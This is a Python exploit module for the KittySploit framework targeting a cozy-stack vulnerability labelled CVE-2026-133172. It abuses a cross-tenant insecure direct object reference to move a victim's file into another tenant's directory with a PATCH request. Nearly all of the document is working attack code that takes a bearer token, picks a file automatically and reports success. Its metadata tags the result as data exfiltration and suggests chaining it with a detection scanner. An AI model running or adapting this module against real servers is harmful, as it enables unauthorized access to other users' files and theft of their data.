#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-133172 — cozy-stack cross-tenant file move."""

from kittysploit import *
from lib.protocols.http.cozy_stack import Cozy_stack
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client, Cozy_stack):
    __info__ = {
        "name": "cozy-stack CVE-2026-133172 drive move",
        "description": "PATCH file into another directory (cross-tenant IDOR).",
        "author": ["LLCForge", "KittySploit Team"],
        "cve": ["CVE-2026-133172"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-133172"],
        "tags": ["cozy", "idor", "cve-2026-133172", "auxiliary"],
        "agent": {
            "approval_required": True,
            "produces": ["data_exfil"],
            "chain": {
                "suggested_followups": ["scanner/http/cozy_stack_cve_2026_133172_detect"],
            },
        },
    }

    api_token = OptString("", "cozy-stack bearer token", required=True)
    file_id = OptString("", "Source file ID (auto: first root file)", required=False)
    victim_dir = OptString(
        "io.cozy.files.shared-with-me-dir",
        "Target directory ID",
        required=False,
    )

    def run(self):
        ok, _ = self.cozy_instance_ok()
        if not ok:
            print_error("API not reachable with token")
            return False
        fid = str(self.file_id or "").strip()
        if hasattr(self, "file_id") and hasattr(self.file_id, "value"):
            fid = str(self.file_id.value or "").strip()
        if not fid:
            files = self.cozy_list_root_files()
            fid = str(files[0].get("id") or "") if files else ""
        if not fid:
            print_error("No file_id — set file_id option")
            return False
        target = str(self.victim_dir or "io.cozy.files.shared-with-me-dir")
        if hasattr(self, "victim_dir") and hasattr(self.victim_dir, "value"):
            target = str(self.victim_dir.value or target)
        code, body = self.cozy_move_file(fid, target)
        if code not in (200, 204):
            print_error(f"Move rejected HTTP {code}")
            return False
        print_success(f"File {fid} moved to {target}")
        self.set_info(severity="high", cve="CVE-2026-133172", file_id=fid, dir_id=target)
        return True